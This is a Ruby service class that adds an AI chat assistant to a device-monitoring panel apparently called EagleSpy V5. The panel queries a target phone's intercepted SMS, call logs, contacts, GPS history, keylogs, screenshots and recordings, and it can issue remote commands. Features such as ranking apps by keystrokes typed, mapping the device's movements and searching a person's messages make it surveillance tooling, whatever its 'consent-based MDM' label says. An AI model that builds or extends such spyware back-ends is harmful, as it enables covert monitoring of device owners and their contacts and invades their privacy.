# frozen_string_literal: true

class AiChatService < ApplicationService
  MAX_HISTORY = 20

  ALLOWED_MCP_TOOLS = %w[
    list_devices get_device get_device_status search_devices get_device_stats
    get_locations get_sms_messages get_call_logs get_contacts get_photos
    send_command get_command_status get_command_history schedule_command
    detect_deepfakes analyze_behavior detect_anomalies generate_report
    get_timeline search_data
  ].freeze

  MODEL_MAP = {
    'SmsMessage' => SmsMessage,
    'Contact' => Contact,
    'CallLog' => CallLog,
    'GeoLocation' => GeoLocation,
    'Keylog' => Keylog,
    'Screenshot' => Screenshot,
    'Recording' => Recording,
    'InstalledApp' => InstalledApp,
    'Picture' => Picture
  }.freeze

  QUERY_PATTERNS = {
    /\b(show|list|get|find)\b.*\b(calls?|call\s*logs?)\b.*\bto\b\s+(.+)/i => :query_calls_to,
    /\b(show|list|get|find)\b.*\b(sms|messages?|texts?)\b.*\b(from|to)\b\s+(.+)/i => :query_sms,
    /\bwhere\b.*\bdevice\b.*\b(yesterday|today|last\s+\w+)/i => :query_location,
    /\b(location|position|where)\b.*\b(yesterday|today|last\s+\w+|now)\b/i => :query_location,
    /\b(top|most)\b.*\b(contacts?|called|messaged)\b/i => :query_top_contacts,
    /\b(how many|count|total)\b.*\b(sms|messages?|calls?|photos?|keylogs?)\b/i => :query_count,
    /\b(activity|summary|overview|report)\b/i => :query_activity_summary,
    /\b(apps?|applications?)\b.*\b(used|usage|top)\b/i => :query_app_usage,
    /\b(anomal|unusual|suspicious|risk)\b/i => :query_anomalies,
    /\bhelp\b/i => :query_help
  }.freeze

  def initialize(device, message, options = {})
    @device = device
    @message = message.to_s.strip
    @history = Array(options[:history]).last(MAX_HISTORY)
    @api_key = ENV['GEMINI_API_KEY']
  end

  def call
    return Result.failure('Device is required') unless @device
    return Result.failure('Message is required') if @message.blank?

    response = if @api_key.present?
                 ai_powered_response
               else
                 pattern_matched_response
               end

    Result.success(response)
  rescue StandardError => e
    Rails.logger.error("[AiChatService] #{e.message}")
    Result.failure(e.message)
  end

  private

  # --- Pattern-based query parser (fallback when no AI API configured) ---

  def pattern_matched_response
    QUERY_PATTERNS.each do |pattern, method|
      match = @message.match(pattern)
      if match
        return build_response(send(method, match))
      end
    end

    build_response(
      text: "I understood your message but couldn't match a specific query. Try:\n" \
            "• \"Show calls to John\"\n• \"Where was device yesterday\"\n" \
            "• \"How many SMS today\"\n• \"Top contacts\"\n• \"Activity summary\"\n" \
            "• \"App usage\"\n• Type 'help' for all commands",
      type: 'info'
    )
  end

  def build_response(data)
    {
      role: 'assistant',
      content: data[:text],
      type: data[:type] || 'text',
      data: data[:data],
      visualization: data[:visualization],
      context: { device_id: @device.device_id, query: @message, timestamp: Time.current.iso8601 }
    }
  end

  # --- Query handlers ---

  def query_calls_to(match)
    contact_name = match[3].strip
    calls = @device.call_logs
                    .where('phone_number ILIKE :q OR contact_name ILIKE :q', q: "%#{contact_name}%")
                    .order(created_at: :desc)
                    .limit(20)

    rows = calls.map { |c| { number: c.phone_number, type: c.call_type, duration: c.duration, date: c.created_at.strftime('%Y-%m-%d %H:%M') } }

    {
      text: calls.any? ? "Found #{calls.size} call(s) matching '#{contact_name}':" : "No calls found matching '#{contact_name}'.",
      type: 'table',
      data: rows,
      visualization: { type: 'table', columns: %w[number type duration date] }
    }
  rescue StandardError => e
    { text: "Error searching calls: #{e.message}", type: 'error' }
  end

  def query_sms(match)
    direction = match[3]
    contact = match[4].strip
    messages = @device.sms_messages
                      .where('address ILIKE :q OR body ILIKE :q', q: "%#{contact}%")
                      .order(created_at: :desc)
                      .limit(20)

    rows = messages.map { |m| { address: m.address, type: m.message_type, preview: m.body.to_s.truncate(80), date: m.created_at.strftime('%Y-%m-%d %H:%M') } }

    {
      text: messages.any? ? "Found #{messages.size} message(s) #{direction} '#{contact}':" : "No messages found for '#{contact}'.",
      type: 'table',
      data: rows,
      visualization: { type: 'table', columns: %w[address type preview date] }
    }
  rescue StandardError => e
    { text: "Error searching messages: #{e.message}", type: 'error' }
  end

  def query_location(match)
    time_ref = match.captures.last.strip.downcase
    range = parse_time_reference(time_ref)

    locations = @device.geo_locations
                       .where(created_at: range)
                       .order(created_at: :desc)
                       .limit(50)

    points = locations.map { |l| { lat: l.latitude.to_f, lng: l.longitude.to_f, time: l.created_at.strftime('%H:%M') } }

    {
      text: locations.any? ? "Found #{locations.size} location point(s) for '#{time_ref}':" : "No location data for '#{time_ref}'.",
      type: 'map',
      data: points,
      visualization: { type: 'map', center: points.first }
    }
  rescue StandardError => e
    { text: "Error querying locations: #{e.message}", type: 'error' }
  end

  def query_top_contacts(_match)
    sms_top = @device.sms_messages.group(:address).order(Arel.sql('COUNT(*) DESC')).limit(5).count
    call_top = @device.call_logs.group(:phone_number).order(Arel.sql('COUNT(*) DESC')).limit(5).count

    rows = []
    (sms_top.keys + call_top.keys).uniq.first(10).each do |contact|
      rows << { contact: contact, sms: sms_top[contact] || 0, calls: call_top[contact] || 0 }
    end
    rows.sort_by! { |r| -(r[:sms] + r[:calls]) }

    {
      text: "Top contacts by communication frequency:",
      type: 'table',
      data: rows,
      visualization: { type: 'bar_chart', x: 'contact', y: %w[sms calls] }
    }
  rescue StandardError => e
    { text: "Error querying contacts: #{e.message}", type: 'error' }
  end

  def query_count(match)
    data_type = match.captures.last.strip.downcase
    count = case data_type
            when /sms|message|text/ then @device.sms_messages.count
            when /call/            then @device.call_logs.count
            when /photo|picture/   then @device.pictures.count
            when /keylog/          then @device.keylogs.count
            else 0
            end

    { text: "Total #{data_type}: **#{count}**", type: 'text', data: { type: data_type, count: count } }
  rescue StandardError => e
    { text: "Error counting: #{e.message}", type: 'error' }
  end

  def query_activity_summary(_match)
    service = StatisticsService.new(@device, days_range: 7)
    overview = service.calculate[:overview]

    {
      text: "📊 Activity Summary (Last 7 days):\n" \
            "• SMS: #{overview[:total_sms]}\n• Calls: #{overview[:total_calls]}\n" \
            "• Photos: #{overview[:total_photos]}\n• Keylogs: #{overview[:total_keylogs]}\n" \
            "• Locations: #{overview[:total_locations]}\n• Contacts: #{overview[:total_contacts]}",
      type: 'summary',
      data: overview
    }
  rescue StandardError => e
    { text: "Error generating summary: #{e.message}", type: 'error' }
  end

  def query_app_usage(_match)
    apps = @device.keylogs
                  .where('created_at >= ?', 7.days.ago)
                  .group(:application_label)
                  .count
                  .sort_by { |_, v| -v }
                  .first(10)
                  .map { |app, count| { app: app || 'Unknown', count: count } }

    {
      text: "Top apps by usage (last 7 days):",
      type: 'chart',
      data: apps,
      visualization: { type: 'pie_chart', label: 'app', value: 'count' }
    }
  rescue StandardError => e
    { text: "Error querying app usage: #{e.message}", type: 'error' }
  end

  def query_anomalies(_match)
    report_service = ReportGenerationService.new(@device, template: 'security_audit', period: 'weekly')
    result = report_service.call
    if result.success?
      risk = result.value[:risk_assessment]
      {
        text: "🔍 Risk Assessment: #{risk[:level].upcase} (score: #{risk[:score]}/100)\n" \
              "Factors: #{risk[:factors].map { |f| f[:detail] }.join(', ').presence || 'None detected'}",
        type: 'alert',
        data: risk
      }
    else
      { text: "Could not run anomaly detection: #{result.error}", type: 'error' }
    end
  end

  def query_help(_match)
    {
      text: "🤖 **AI Chat Commands:**\n" \
            "• \"Show calls to [name]\" — Search call logs\n" \
            "• \"Show SMS from [contact]\" — Search messages\n" \
            "• \"Where was device yesterday/today\" — Location history\n" \
            "• \"How many SMS/calls/photos\" — Count records\n" \
            "• \"Top contacts\" — Most frequent contacts\n" \
            "• \"Activity summary\" — Weekly overview\n" \
            "• \"App usage\" — Top apps by keystroke volume\n" \
            "• \"Risk/anomalies\" — Security assessment",
      type: 'info'
    }
  end

  # --- AI-powered response (when Gemini API key is configured) ---

  def ai_powered_response
    system_prompt = build_system_prompt
    messages = [{ role: 'system', content: system_prompt }]
    @history.each { |h| messages << { role: h['role'] || h[:role], content: h['content'] || h[:content] } }
    messages << { role: 'user', content: @message }

    ai_response = call_gemini(messages)

    if ai_response[:tool_call]
      data = execute_mcp_tool(ai_response[:tool_call])
      build_response(text: ai_response[:text], type: ai_response[:type] || 'text', data: data, visualization: ai_response[:visualization])
    elsif ai_response[:query]
      data = execute_parsed_query(ai_response[:query])
      build_response(text: ai_response[:text], type: ai_response[:type] || 'text', data: data, visualization: ai_response[:visualization])
    else
      build_response(text: ai_response[:text] || ai_response.to_s, type: 'text')
    end
  rescue StandardError => e
    Rails.logger.warn("[AiChatService] AI fallback to pattern matching: #{e.message}")
    pattern_matched_response
  end

  def build_system_prompt
    <<~PROMPT
      You are an AI assistant for EagleSpy V5, a consent-based enterprise MDM platform.
      Device: #{@device.device_id} (#{@device.name.to_s.gsub(/[^a-zA-Z0-9\s\-_]/, '').truncate(50)})
      Available data: sms_messages, call_logs, geo_locations, keylogs, pictures, contacts, recordings.
      
      You can execute database queries or call specialized analysis tools.
      Respond with JSON:
      { 
        "text": "human readable explanation", 
        "type": "table|chart|map|alert|text", 
        "query": { "model": "...", "conditions": {...}, "limit": N },
        "tool_call": { "name": "tool_name", "arguments": {...} },
        "visualization": { "type": "...", ... }
      }

      Available Tools:
      - detect_anomalies: For security patterns, location jumps, and usage spikes.
      - detect_deepfakes: For media integrity, voice analysis, and tamper detection.
      - analyze_behavior: For general device usage stats.
      - generate_report: For a full device summary.
    PROMPT
  end

  def execute_mcp_tool(tool_call)
    return nil unless tool_call.is_a?(Hash) && tool_call[:name].present?
    return nil unless ALLOWED_MCP_TOOLS.include?(tool_call[:name])

    server = Mcp::McpServer.new
    # Mock auth for internal chat use
    auth = Struct.new(:authorize!, :audit_log).new(
      ->(scope) {
        allowed_scopes = %w[device:read device:command analytics:read]
        raise "Unauthorized scope: #{scope}" unless allowed_scopes.include?(scope.to_s)
        true
      },
      ->(action, details = {}) {
        Rails.logger.info("[MCP Audit] Action: #{action}, Details: #{details}")
      }
    )
    
    arguments = (tool_call[:arguments] || {}).merge(device_id: @device.device_id)
    result = server.call_tool(name: tool_call[:name], arguments: arguments, auth: auth)
    
    JSON.parse(result.dig(:content, 0, :text) || '{}')
  rescue StandardError => e
    Rails.logger.error("[AiChatService] Tool execution failed: #{e.message}")
    { error: e.message }
  end

  def call_gemini(messages)
    sanitized = sanitize_messages_for_ai(messages)

    model = ENV.fetch('GEMINI_MODEL', 'gemini-2.0-flash')
    uri = URI("https://generativelanguage.googleapis.com/v1beta/models/#{model}:generateContent?key=#{@api_key}")
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = true
    http.open_timeout = 10
    http.read_timeout = 30

    # Convert message format to Gemini format
    system_instruction = sanitized.find { |m| m[:role] == 'system' }&.dig(:content)
    contents = sanitized.reject { |m| m[:role] == 'system' }.map do |m|
      { role: m[:role] == 'assistant' ? 'model' : 'user', parts: [{ text: m[:content] }] }
    end

    request = Net::HTTP::Post.new(uri)
    request['Content-Type'] = 'application/json'
    body = {
      contents: contents,
      generationConfig: { temperature: 0.3, maxOutputTokens: 1000 }
    }
    body[:systemInstruction] = { parts: [{ text: system_instruction }] } if system_instruction
    request.body = body.to_json

    response = http.request(request)
    parsed = JSON.parse(response.body)
    content = parsed.dig('candidates', 0, 'content', 'parts', 0, 'text') || ''

    JSON.parse(content, symbolize_names: true)
  rescue JSON::ParserError
    { text: content, type: 'text' }
  end

  def execute_parsed_query(query)
    return nil unless query.is_a?(Hash)

    model_name = query[:model].to_s.classify
    model_class = MODEL_MAP[model_name]
    return nil unless model_class

    model_class.where(smartphone: @device).limit(query[:limit] || 20).as_json
  rescue StandardError => e
    Rails.logger.warn("[AiChatService] Query execution failed: #{e.message}")
    nil
  end

  # --- Privacy ---

  # Strip PII before sending data to external AI APIs
  def sanitize_for_ai(data)
    return data unless data.is_a?(Hash)

    data = data.deep_dup
    %i[phone_number imei contacts contact_name address].each { |k| data.delete(k) }

    if data[:location].is_a?(Hash)
      data[:location] = {
        lat: data[:location][:lat]&.round(2),
        lng: data[:location][:lng]&.round(2)
      }
    end

    data.transform_values { |v| v.is_a?(Hash) ? sanitize_for_ai(v) : v }
  end

  def sanitize_messages_for_ai(messages)
    messages.map do |msg|
      content = msg[:content] || msg['content'] || ''
      sanitized = content.gsub(/\b\d{10,15}\b/, '[REDACTED_PHONE]')
                         .gsub(/\b\d{15}\b/, '[REDACTED_IMEI]')
      { role: msg[:role] || msg['role'], content: sanitized }
    end
  end

  # --- Helpers ---

  def parse_time_reference(ref)
    case ref
    when 'today'     then Time.current.all_day
    when 'yesterday' then 1.day.ago.all_day
    when /last\s*(\d+)\s*hours?/  then $1.to_i.hours.ago..Time.current
    when /last\s*(\d+)\s*days?/   then $1.to_i.days.ago..Time.current
    when /last\s*week/            then 7.days.ago..Time.current
    when /last\s*month/           then 30.days.ago..Time.current
    when 'now'                    then 1.hour.ago..Time.current
    else 24.hours.ago..Time.current
    end
  end
end
